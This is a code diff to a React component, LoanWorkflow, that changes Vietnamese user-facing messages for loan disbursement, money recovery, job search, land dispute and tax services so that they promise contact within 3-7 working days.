@@ -624,17 +624,17 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
     const getServiceInfo = () => {
         switch (currentService) {
             case 'vay-von':
-                return { title: 'Giải ngân vay vốn', waitingMsg: 'giải ngân', successMsg: 'Tiền sẽ được chuyển vào tài khoản của bạn trong 3-5 ngày làm việc.' };
+                return { title: 'Giải ngân vay vốn', waitingMsg: 'giải ngân', successMsg: 'Tiền sẽ được chuyển vào tài khoản của bạn trong 3-7 ngày làm việc.' };
             case 'tien-treo':
-                return { title: 'Hỗ trợ lấy lại tiền treo', waitingMsg: 'xử lý hồ sơ', successMsg: 'Chúng tôi sẽ liên hệ hỗ trợ bạn lấy lại tiền trong thời gian sớm nhất.' };
+                return { title: 'Hỗ trợ lấy lại tiền treo', waitingMsg: 'xử lý hồ sơ', successMsg: 'Chúng tôi sẽ liên hệ hỗ trợ bạn lấy lại tiền trong 3-7 ngày làm việc.' };
             case 'tim-viec':
-                return { title: 'Hỗ trợ tìm việc làm', waitingMsg: 'xử lý hồ sơ', successMsg: 'Chúng tôi sẽ liên hệ giới thiệu việc làm phù hợp trong thời gian sớm nhất.' };
+                return { title: 'Hỗ trợ tìm việc làm', waitingMsg: 'xử lý hồ sơ', successMsg: 'Chúng tôi sẽ liên hệ giới thiệu việc làm phù hợp trong 3-7 ngày làm việc.' };
             case 'dat-dai':
-                return { title: 'Giải quyết đất đai', waitingMsg: 'xử lý hồ sơ', successMsg: 'Bộ phận pháp lý sẽ liên hệ hỗ trợ giải quyết tranh chấp trong thời gian sớm nhất.' };
+                return { title: 'Giải quyết đất đai', waitingMsg: 'xử lý hồ sơ', successMsg: 'Bộ phận pháp lý sẽ liên hệ hỗ trợ giải quyết tranh chấp trong 3-7 ngày làm việc.' };
             case 'nop-thue':
-                return { title: 'Kê khai thuế', waitingMsg: 'xử lý hồ sơ', successMsg: 'Chúng tôi sẽ liên hệ hướng dẫn hoàn tất kê khai thuế trong thời gian sớm nhất.' };
+                return { title: 'Kê khai thuế', waitingMsg: 'xử lý hồ sơ', successMsg: 'Chúng tôi sẽ liên hệ hướng dẫn hoàn tất kê khai thuế trong 3-7 ngày làm việc.' };
             default:
-                return { title: 'Xử lý hồ sơ', waitingMsg: 'xử lý', successMsg: 'Chúng tôi sẽ liên hệ với bạn trong thời gian sớm nhất.' };
+                return { title: 'Xử lý hồ sơ', waitingMsg: 'xử lý', successMsg: 'Chúng tôi sẽ liên hệ với bạn trong 3-7 ngày làm việc.' };
         }
     };
     const serviceInfo = getServiceInfo();
